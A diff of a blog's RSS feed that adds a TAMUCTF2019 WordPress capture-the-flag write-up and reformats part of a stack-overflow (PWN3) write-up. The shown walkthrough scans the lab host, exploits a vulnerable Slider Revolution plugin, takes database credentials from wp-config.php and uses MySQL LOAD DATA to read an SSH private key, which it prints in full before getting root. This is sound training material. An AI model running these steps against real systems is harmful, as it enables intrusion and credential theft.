@@ -6,8 +6,8 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 02 Apr 2020 19:29:16 -0300</pubDate>
-    <lastBuildDate>Thu, 02 Apr 2020 19:29:16 -0300</lastBuildDate>
+    <pubDate>Thu, 02 Apr 2020 22:32:00 -0300</pubDate>
+    <lastBuildDate>Thu, 02 Apr 2020 22:32:00 -0300</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
     
       <item>
@@ -45,52 +45,254 @@
       </item>
     
       <item>
+        <title>TAMUCTF2019 Wordpress Write-up</title>
+        <description>&lt;p&gt;Hey guys! This post i’m my mindset on how I solved the Wordpress challenge from TAMUCTF2019&lt;/p&gt;
+
+&lt;p&gt;This kind of challenge is very similar to those HackTheBox challenges, where you have to get RCE from a system and then escalate your privileges to root! Let’s GO.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As I said before our goal is to get the flag inside “/root/flag.txt” since it is inside the root folder we must become root to read it. (Most of the time)
+We’re given an openvpn config file to connect to that docker network where the machine is running.&lt;/p&gt;
+
+&lt;p&gt;Let’s start our enumaration with nmap.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;nmap -sV -sC 170.30.0.3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we get the following services.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;~/ctf/tamu/wordpress # nmap 172.30.0.3 -sV -sC                                                                                                                    root@kali
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 18:05 EST
+Nmap scan report for 172.30.0.3
+Host is up (0.19s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 0d:1f:51:d6:f3:3e:07:f6:cc:0f:4f:88:12:de:e2:52 (DSA)
+|   2048 75:cb:36:cf:54:fa:ed:48:99:93:d2:54:a3:b0:8e:8c (RSA)
+|   256 f8:59:11:11:0f:74:31:39:55:40:2c:3a:f9:52:9c:45 (ECDSA)
+|_  256 fe:af:37:4e:b6:78:d8:4f:ec:5b:71:a6:c3:64:c1:ae (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: WordPress 5.1
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: TAMUctf &amp;amp;#8211; Just another WordPress site
+MAC Address: 02:42:C7:86:A7:37 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Based on the nmap result, we got an ssh and HTTP Service. Cool, probably the WordPress site, so let’s focus on this.When we open the wordpress site, nothing calls our attention to explore so Iran WPScan against it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;wspcan --url http://172.30.0.3
+[+] revslider
+ | Location: http://172.30.0.3/wp-content/plugins/revslider/
+ |
+ | Detected By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: WordPress Slider Revolution Local File Disclosure
+ |     Fixed in: 4.1.5
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/7540
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
+ |      - https://www.exploit-db.com/exploits/34511/
+ |      - https://www.exploit-db.com/exploits/36039/
+ |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
+ |      - http://packetstormsecurity.com/files/129761/
+ |
+ | [!] Title: WordPress Slider Revolution Shell Upload
+ |     Fixed in: 3.0.96
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/7954
+ |      - https://www.exploit-db.com/exploits/35385/
+ |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
+ |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
+ |
+ | The version could not be determined.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This part cought my attention, apparently this wordpress is running “Slider Revolution” which seems to have a few exploits available. So I googled them a bit.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/alert.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I found this modulo on metasploit that leads to RCE directly, I ran it but no so confident It would work.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But hey it did work and I got my reverse shell! Cool, part 1 finished.&lt;/p&gt;
+
+&lt;p&gt;Next step is to figure out how we can escalate our privileges to root. Let’s enumerate.&lt;/p&gt;
+
+&lt;p&gt;Without going very far I found an interesting file in /var/www called note.txt.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;Your ssh key was placed in /backup/id_rsa on the DB server.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hum? So the mysql database running for the wordpress, is not running in this server? Let’s find out where it is.&lt;/p&gt;
+
+&lt;p&gt;By going through the Wordpress config files we must check wp-config.php.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MySQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;You&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/** MySQL database username */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/** MySQL database password */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0NYa6PBH52y86C'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/** MySQL hostname */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'172.30.0.2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That’s interesting, we got DB_NAME, DB_USER, DB_PASSWORD and DB_HOST&lt;/p&gt;
+
+&lt;p&gt;At this time the challenge is basically over. Let’s connect to the mysql server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;~/ctf/tamu/wordpress # mysql -h 172.30.0.2 -u wordpress -p0NYa6PBH52y86C   
+root@kali Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 65
+Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We got our connection, so we’re inside the 172.30.0.2 where the backup ssh key is stored at /backup/id_rsa all we have to do now is read this file with mysql.&lt;/p&gt;
+
+&lt;p&gt;So i created a table foo inside Mysql database.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;MySQL [mysql]&amp;gt; create table foo(line blob);
+Query OK, 0 rows affected (0.20 sec)
+
+MySQL [mysql]&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I loaded the content of the ssh key file inside the table.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;MySQL [mysql]&amp;gt; LOAD DATA infile '/backup/id_rsa' INTO TABLE foo;
+Query OK, 27 rows affected (0.20 sec)
+Records: 27  Deleted: 0  Skipped: 0  Warnings: 0
+MySQL [mysql]&amp;gt; select * from foo
+    -&amp;gt; ;
++------------------------------------------------------------------+
+| line                                                             |
++------------------------------------------------------------------+
+| -----BEGIN RSA PRIVATE KEY-----                                  |
+| MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc |
+| tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt |
+| ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33 |
+| ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw |
+| 8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6 |
+| Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt |
+| 1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX |
+| AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY |
+| WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L |
+| oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN |
+| l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9 |
+| oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv |
+| 5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl |
+| SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0 |
+| bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc |
+| iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO |
+| LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN |
+| nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ |
+| SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa |
+| WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB |
+| dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB |
+| E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv |
+| hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg |
+| bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe |
+| On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==         |
+| -----END RSA PRIVATE KEY-----                                    |
++------------------------------------------------------------------+
+27 rows in set (0.20 sec)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I copied this private to my local computer and used to log via ssh.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we got Root!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
+
+&lt;p&gt;by me&lt;/p&gt;
+</description>
+        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/tamuctf2019-wordpress-write-up/</link>
+        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-wordpress-write-up/</guid>
+        
+        <category>CTF</category>
+        
+        <category>|</category>
+        
+        <category>RATF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
         <title>TAMUCTF2019 PWN3 Write-up</title>
         <description>&lt;p&gt;Hey Guys! This post i’ll be showing you how I managed to solve PWN3 challenge from TAMUCTF2019!
 This was a standard stack execution where we had to insert our shellcode in the stack and point ou EIP there to execute it. Let’GO!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/jekyll/1/example.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/example.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Let’s execute the binary locally to see what happens.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/jekyll/1/code1.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/code1.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;After sending a lot of bytes we get a “seg fault” and that’s what we want. Using GDB let’s find out how many bytes we must send to control EIP.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern_create&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;
-&lt;span class=&quot;s1&quot;&gt;'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;gdb-peda$ pattern_create 400
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'
 
-&lt;span class=&quot;no&quot;&gt;Legend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rodata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Stopped&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;reason: &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SIGSEGV&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x25416825&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern_search&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Registers&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;buffer:
-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EBX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;offset: &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;294&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;EBP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;offset: &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;298&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;offset: &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;302&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Registers&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;point&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;buffer:
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;203&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ESP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;306&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x25416825 in ?? ()
+gdb-peda$ pattern_search
+Registers contain pattern buffer:
+EBX+0 found at offset: 294
+EBP+0 found at offset: 298
+EIP+0 found at offset: 302
+Registers point to pattern buffer:
+[EAX] --&amp;gt; offset 0 - size ~203
+[ESP] --&amp;gt; offset 306 - size ~94&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Using pattern_search we discover that offset is 302 bytes long. Cool valuable information there, but where is our ESP? Since that value keeps changing when we connect via netcat ASLR is on, so it gets hard to know where to point to. So we need to discover what is the address that pops up when the program is executed.&lt;/p&gt;
 
 &lt;p&gt;Running a few times in different environments I noticed that we can use this address to determine the exact position of our ESP, because that address + 0x132 = $ESP&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;program: &lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/root/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tamu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwn3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwn3&lt;/span&gt; 
-&lt;span class=&quot;no&quot;&gt;Take&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;might&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;need&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;journey&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd01e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mcd&quot; data-lang=&quot;mcd&quot;&gt;Starting program: /root/ctf/tamu/pwn3/pwn3 
+Take this, you might need it on your journey 0xffffd01e!
 
-&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wx&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$esp&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xffffd150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4d254137&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41692541&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x25413825&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6a25414e&lt;/span&gt;
+gdb-peda$ x/5wx $esp
+0xffffd150: 0x4d254137 0x41692541 0x25413825 0x6a25414e
 
-&lt;span class=&quot;no&quot;&gt;So&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doing&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd150&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffd01e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x132&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+So, by doing 0xffffd150 - 0xffffd01e = 0x132&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Cool! Now we have everything set, let’s create our exploit.&lt;/p&gt;
 
 &lt;p&gt;Got my shellcode from shellstorm.com&lt;/p&gt;
 
